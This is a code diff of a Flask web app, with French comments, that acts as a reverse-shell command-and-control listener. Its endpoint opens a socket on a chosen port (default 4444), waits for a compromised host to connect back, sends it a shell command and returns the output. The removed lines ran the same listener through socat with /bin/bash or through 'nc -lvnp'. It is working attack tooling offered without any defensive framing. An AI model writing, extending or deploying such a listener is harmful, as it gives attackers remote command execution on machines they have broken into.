@@ -1,83 +1,64 @@
 from flask import Flask, render_template, request, jsonify
-import subprocess
 import threading
+import socket
 import time
-import shutil
 
 app = Flask(__name__)
 
 listener_thread = None
 listener_active = False
 listener_output = ""
+conn = None
 
 def run_listener(port, command):
-    global listener_active, listener_output
+    global listener_active, listener_output, conn
     listener_active = True
+    listener_output = f"[+] Listener lancé sur le port {port}...\nEn attente de connexion..."
     try:
-        listener_output = f"Recherche d'outil disponible... (port {port})"
-        use_socat = shutil.which("socat") is not None
-        use_nc = shutil.which("nc") is not None
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.bind(('0.0.0.0', port))
+            s.listen(1)
+            s.settimeout(30)  # Timeout 30s pour connexion
+            conn, addr = s.accept()
+            listener_output += f"\n[+] Connexion reçue de {addr}."
 
-        if use_socat:
-            # socat lance un shell interactif, mais stdin n'est pas simple à manipuler ici
-            cmd = ["socat", f"TCP4-LISTEN:{port},reuseaddr,fork", "EXEC:/bin/bash"]
-            listener_output = f"[+] Listener lancé avec socat sur le port {port}..."
-        elif use_nc:
-            # netcat en mode écoute verbose, on peut envoyer des commandes via stdin
-            cmd = ["bash", "-c", f"nc -lvnp {port}"]
-            listener_output = f"[+] Listener lancé avec netcat sur le port {port}..."
-        else:
-            listener_output = "[-] Aucun outil (socat ou netcat) trouvé sur le système."
-            listener_active = False
-            return
+            # Envoyer la commande + newline
+            conn.sendall((command + "\n").encode())
 
-        proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            # Lire la réponse (max 1024 bytes ici, à adapter)
+            time.sleep(1)  # Laisser le temps au shell d'exécuter
+            conn.settimeout(2)
+            data = b""
+            try:
+                while True:
+                    chunk = conn.recv(1024)
+                    if not chunk:
+                        break
+                    data += chunk
+            except socket.timeout:
+                pass
 
-        # On attend une ligne de sortie, qui indique la connexion entrante
-        for _ in range(30):
-            line = proc.stdout.readline()
-            if line:
-                listener_output += "\n[+] Connexion détectée ! Envoi de la commande..."
-                break
-            time.sleep(1)
-        else:
-            listener_output += "\n[-] Aucune connexion après 30 secondes."
-            proc.kill()
-            listener_active = False
-            return
+            listener_output += f"\n[+] Résultat de `{command}` :\n" + data.decode(errors='ignore')
 
-        # Avec netcat, on peut envoyer la commande; avec socat c'est plus compliqué (stdin non connecté)
-        if use_nc:
-            proc.stdin.write(command + "\n")
-            proc.stdin.flush()
-
-        # Lecture de la sortie de la commande
-        output_lines = []
-        for _ in range(10):
-            line = proc.stdout.readline()
-            if not line:
-                break
-            output_lines.append(line.strip())
-            time.sleep(0.5)
-
-        listener_output += f"\n[+] Résultat de `{command}` :\n" + "\n".join(output_lines)
-
+    except socket.timeout:
+        listener_output += "\n[-] Timeout : aucune connexion reçue."
     except Exception as e:
-        listener_output = f"[!] Erreur : {str(e)}"
+        listener_output += f"\n[!] Erreur : {str(e)}"
     finally:
         listener_active = False
+        if conn:
+            conn.close()
 
 @app.route("/")
 def index():
-    return render_template("index.html")  # ta page HTML doit gérer les appels AJAX
+    return render_template("index.html")
 
 @app.route("/start_listener", methods=["POST"])
 def start_listener():
     global listener_thread, listener_active
     if not listener_active:
-        data = request.get_json(force=True)
-        port = int(data.get("port", 4444))
-        command = data.get("command", "id")
+        port = int(request.json.get("port", 4444))
+        command = request.json.get("command", "id")
         listener_thread = threading.Thread(target=run_listener, args=(port, command))
         listener_thread.start()
         return jsonify({"status": f"Listener démarré sur le port {port}..."})
